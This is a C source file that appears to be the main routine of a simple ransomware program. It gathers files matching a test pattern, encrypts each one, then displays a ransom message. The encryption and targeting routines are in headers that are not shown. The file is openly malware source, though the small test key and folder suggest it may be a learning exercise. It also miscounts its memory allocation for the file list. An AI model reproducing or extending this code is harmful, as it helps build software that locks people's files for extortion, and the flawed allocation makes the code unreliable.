#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <glob.h>
#include "display.h"
#include "fs.h"
#include "crypt.h"

#define BUFSZ 256
#define MAX_FILE_COUNT 1000
#define TEST_PATTERN "tocrypt/*.txt"
#define TEST_KEY 4

int main() {
    char** fileList;
    int fileCount;
    int r;

    fileCount = 0;
    fileList = malloc(MAX_FILE_COUNT);

    // Generate file list
    printf("Populating file list...\n");
    r = generate_target_list(fileList, &fileCount);
    if (r != 0) {
        perror("generate_target_list");
        return -1;
    }

    // Encrypt file list
    for (int i = 0; i < fileCount; ++i) {
        printf("Encrypting file %d of %d: %s\n", i, fileCount, fileList[i]);
        if (encrypt(fileList[i]) != 0) {
            perror("encrypt");
            return -1;
        }
    }

    // Display ransom
    printf("Displaying ransom...\n");
    displayRansom();

    printf("Cleaning up...\n");
    for (int i = 0; i < fileCount; ++i) {
        free(fileList[i]);
    }

    if (fileList != NULL)
        free(fileList);

    return 0;
}
